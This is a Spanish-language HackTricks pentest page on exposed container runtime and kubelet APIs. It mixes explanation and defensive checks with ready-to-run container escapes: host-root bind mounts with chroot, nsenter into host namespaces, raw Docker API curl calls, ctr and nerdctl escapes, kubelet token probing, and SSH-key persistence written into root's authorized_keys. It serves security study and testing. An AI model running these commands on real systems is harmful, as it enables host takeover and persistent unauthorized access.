# Exposición de la API del runtime y del daemon

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general

Muchas intrusiones reales en contenedores no empiezan con un escape de namespace. Empiezan con acceso al plano de control del runtime. Si una carga de trabajo puede comunicarse con `dockerd`, `containerd`, CRI-O, Podman o kubelet mediante un socket Unix montado o un listener TCP expuesto, el atacante podría solicitar un nuevo contenedor con mayores privilegios, montar el sistema de archivos del host, unirse a los namespaces del host o recuperar información confidencial del nodo. En esos casos, la API del runtime es el verdadero límite de seguridad, y comprometerla es, en la práctica, casi lo mismo que comprometer el host.

Por eso, la exposición del socket del runtime debe documentarse por separado de las protecciones del kernel. Un contenedor con seccomp, capabilities y confinamiento MAC ordinarios puede estar a una llamada de API de comprometer el host si tiene montado `/var/run/docker.sock` o `/run/containerd/containerd.sock`. El aislamiento del kernel del contenedor actual puede funcionar exactamente según lo previsto, mientras el plano de gestión del runtime permanece completamente expuesto.

## Modelos de acceso al daemon

Docker Engine expone tradicionalmente su API privilegiada mediante el socket Unix local `unix:///var/run/docker.sock`. Históricamente, también se ha expuesto de forma remota mediante listeners TCP como `tcp://0.0.0.0:2375` o un listener protegido con TLS en `2376`. Exponer el daemon de forma remota sin TLS sólido y autenticación de cliente convierte, en la práctica, la API de Docker en una interfaz remota de root.

containerd, CRI-O, Podman y kubelet exponen superficies similares de alto impacto. Los nombres y los flujos de trabajo son diferentes, pero la lógica no. Si la interfaz permite a quien la invoca crear cargas de trabajo, montar rutas del host, recuperar credenciales o modificar contenedores en ejecución, es un canal de gestión privilegiado y debe tratarse como tal.

Una interfaz web de gestión de contenedores puede exponer el mismo límite sin dar a la cuenta local acceso directo al socket. Por ejemplo, [Portainer issue #493](https://github.com/portainer/portainer/issues/493) documentó un restablecimiento no autenticado de la contraseña de administrador en una versión antigua 1.11.1. Considera una interfaz de usuario accesible localmente solo como una pista para investigar: confirma la versión instalada y el comportamiento de autenticación, el control real del administrador y si el endpoint que administra puede crear contenedores con un bind mount del host con permisos de escritura. [La documentación de Portainer](https://docs.portainer.io/admin/environments/add/docker/socket) indica que la gestión respaldada por socket requiere acceso al socket de Docker; un endpoint rootless o restringido cambia el impacto sobre el host. No deduzcas la existencia de una falla de autenticación ni el acceso root al host basándote únicamente en el nombre de un proceso, un puerto o una cadena de versión.

Estas son rutas locales comunes que conviene comprobar:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Las stacks más antiguas o especializadas también pueden exponer endpoints como `dockershim.sock`, `frakti.sock` o `rktlet.sock`. Son menos comunes en los entornos modernos, pero, si se encuentran, deben tratarse con la misma cautela, ya que representan superficies de control del runtime y no sockets de aplicaciones comunes.

## Acceso remoto seguro

Si un daemon debe exponerse más allá del socket local, la conexión debe protegerse con TLS y, preferiblemente, con autenticación mutua, para que el daemon verifique al cliente y el cliente verifique al daemon. La vieja costumbre de abrir el daemon de Docker en HTTP sin cifrar por comodidad es uno de los errores más peligrosos en la administración de contenedores, porque la superficie de la API es lo bastante potente como para crear directamente contenedores con privilegios.

El patrón histórico de configuración de Docker era:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

En hosts basados en systemd, la comunicación con el daemon también puede aparecer como `fd://`, lo que significa que el proceso hereda un socket preabierto de systemd en lugar de enlazarlo directamente. La lección importante no es la sintaxis exacta, sino la consecuencia para la seguridad. En cuanto el daemon escucha más allá de un socket local con permisos estrictos, la seguridad del transporte y la autenticación de clientes pasan a ser obligatorias, no medidas de hardening opcionales.

## Abuso

Si hay un socket de runtime, confirma cuál es, si existe un cliente compatible y si es posible acceder mediante HTTP sin procesar o gRPC:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Estos comandos son útiles porque permiten distinguir entre una ruta muerta, un socket montado pero inaccesible y una API privilegiada activa. Si el cliente funciona, la siguiente pregunta es si la API puede iniciar un contenedor nuevo con un bind mount del host o compartiendo namespaces del host.

### Cuando no hay ningún cliente instalado

La ausencia de `docker`, `podman` u otra CLI fácil de usar no significa que el socket sea seguro. Docker Engine se comunica mediante HTTP a través de su socket Unix, y Podman expone tanto una API compatible con Docker como una API nativa de Libpod mediante `podman system service`. Eso significa que un entorno mínimo con solo `curl` aún puede bastar para controlar el daemon:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Esto es importante durante el post-exploitation porque, a veces, los defensores eliminan los binarios de cliente habituales, pero dejan montado el socket de administración. En los hosts Podman, recuerda que la ruta de alto valor varía entre los despliegues rootful y rootless: `unix:///run/podman/podman.sock` para las instancias de servicio rootful y `unix://$XDG_RUNTIME_DIR/podman/podman.sock` para las rootless.

### Ejemplo completo: del socket de Docker a root en el host

Si se puede acceder a `docker.sock`, el escape clásico consiste en iniciar un contenedor nuevo que monte el sistema de archivos raíz del host y luego ejecutar `chroot` en él:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Esto permite la ejecución directa como root en el host a través del daemon de Docker. El impacto no se limita a la lectura de archivos. Una vez dentro del nuevo contenedor, el atacante puede modificar archivos del host, recolectar credenciales, implantar mecanismos de persistencia o iniciar más cargas de trabajo con privilegios.

### Ejemplo completo: Docker Socket a los namespaces del host

Si el atacante prefiere acceder a los namespaces en lugar de limitarse al acceso al sistema de archivos:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Esta vía alcanza el host al pedirle al runtime que cree un nuevo contenedor con exposición explícita de los namespaces del host, en lugar de explotar el contenedor actual.

### Patrón de persistencia mediante socket de Docker

El control del runtime también puede usarse para obtener persistencia en lugar de una shell de un solo uso. El patrón genérico consiste en crear un contenedor auxiliar con un montaje del host, escribir material de acceso autorizado o un hook de inicio en el sistema de archivos del host montado y, luego, validar que el host lo utilice.

Ejemplo:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

La misma idea puede dirigirse a unidades de systemd, fragmentos de cron, archivos de inicio de aplicaciones o claves SSH, según lo que quiera demostrar el operador. Lo importante es que el cambio persistente se realiza mediante la autoridad del daemon de runtime sobre el sistema de archivos del host, no mediante privilegios adicionales en el contenedor original.

### Raw Docker API Helper Pivot

Cuando falta Docker CLI, se puede ejecutar el mismo flujo de helper con montaje del host mediante HTTP sobre el socket Unix. El flujo genérico es: confirmar la API, crear un contenedor helper con un bind mount del host, iniciarlo, crear una instancia exec e iniciar esa instancia.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

La solicitud final `/exec/<id>/start` depende del ID de exec devuelto, pero el aspecto de seguridad es independiente de los detalles exactos del JSON: el acceso directo a la API de un daemon de Docker con privilegios de root basta para solicitar una carga de trabajo auxiliar con mayores privilegios.

### Ejemplo completo: socket de containerd

Un socket de `containerd` montado suele ser igual de peligroso:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Si hay disponible un cliente más parecido a Docker, `nerdctl` puede ser más práctico que `ctr` porque ofrece flags conocidos como `--privileged`, `--pid=host` y `-v`:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

El impacto vuelve a ser el compromiso del host. Aunque no haya herramientas específicas de Docker, otra API de runtime puede seguir ofreciendo el mismo nivel de control administrativo. En los nodos de Kubernetes, `crictl` también puede bastar para realizar reconocimiento e interactuar con contenedores, ya que se comunica directamente con el endpoint de CRI.

### Socket de BuildKit

Es fácil pasar por alto `buildkitd` porque suele considerarse «solo el backend de compilación», pero el daemon sigue siendo un plano de control privilegiado. Un `buildkitd.sock` accesible puede permitir a un atacante ejecutar pasos de compilación arbitrarios, inspeccionar las capacidades de los workers, usar contextos locales del entorno comprometido y solicitar entitlements peligrosos, como `network.host` o `security.insecure`, si el daemon está configurado para permitirlos.

Algunas primeras interacciones útiles son:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Si el daemon acepta solicitudes de build, comprueba si hay entitlements inseguros disponibles:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

El impacto exacto depende de la configuración del daemon, pero un servicio BuildKit rootful con entitlements permisivos no es una comodidad inocua para desarrolladores. Trátalo como otra superficie administrativa de alto valor, especialmente en runners de CI y nodos de compilación compartidos.

### API de Kubelet sobre TCP

El kubelet no es un runtime de contenedores, pero sigue formando parte del plano de administración del nodo y suele estar dentro del mismo análisis de límites de confianza. Si el puerto seguro `10250` del kubelet es accesible desde la carga de trabajo, o si quedan expuestas credenciales de nodo, kubeconfigs o permisos de proxy, el atacante podría enumerar Pods, recuperar logs o ejecutar comandos en contenedores locales al nodo sin pasar por la ruta de admisión del servidor de la API de Kubernetes.

Empieza con una búsqueda sencilla:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Si la ruta de proxy del kubelet o del API server autoriza `exec`, un cliente compatible con WebSocket puede convertirlo en ejecución de código en otros contenedores del nodo. Por eso `nodes/proxy` con solo permiso `get` es más peligroso de lo que parece: la solicitud aún puede llegar a endpoints del kubelet que ejecutan comandos, y esas interacciones directas con el kubelet no aparecen en los registros de auditoría normales de Kubernetes.<sup>[[2]](#references)</sup>

## Comprobaciones

El objetivo de estas comprobaciones es determinar si el contenedor puede llegar a algún plano de gestión que debería haberse mantenido fuera del límite de confianza.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Qué resulta interesante aquí:

- Un socket de runtime montado suele ser un primitivo de administración directa, no una simple divulgación de información.
- Un listener TCP en `2375` sin TLS debe considerarse una condición de compromiso remoto.
- Las variables de entorno como `DOCKER_HOST` suelen revelar que la carga de trabajo se diseñó intencionalmente para comunicarse con el runtime del host.

## Valores predeterminados del runtime

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual habitual |
| --- | --- | --- | --- |
| Docker Engine | Socket Unix local de forma predeterminada | `dockerd` escucha en el socket local y el daemon suele ejecutarse con privilegios de root | montar `/var/run/docker.sock`, exponer `tcp://...:2375`, usar TLS débil o no usarlo en `2376` |
| Podman | CLI sin daemon de forma predeterminada | No se necesita un daemon privilegiado de larga duración para el uso local habitual; los sockets de API pueden exponerse si se habilita `podman system service` | exponer `podman.sock`, ejecutar el servicio de forma amplia, usar la API con privilegios de root |
| containerd | Socket local privilegiado | API administrativa expuesta a través del socket local y normalmente utilizada por herramientas de nivel superior | montar `containerd.sock`, permitir un acceso amplio a `ctr` o `nerdctl`, exponer namespaces privilegiados |
| CRI-O | Socket local privilegiado | El endpoint CRI está destinado a componentes de confianza locales al nodo | montar `crio.sock`, exponer el endpoint CRI a cargas de trabajo no confiables |
| Kubernetes kubelet | API de administración local al nodo | Kubelet no debería ser ampliamente accesible desde los Pods; el acceso puede exponer el estado de los Pods, credenciales y funciones de ejecución, según la configuración de authn/authz | montar sockets o certificados de kubelet, configurar una autenticación débil en kubelet, usar redes del host junto con un endpoint de kubelet accesible |

## References

- [1] [explotación del socket de containerd, parte 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Riesgos de omisión del API Server de Kubernetes](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
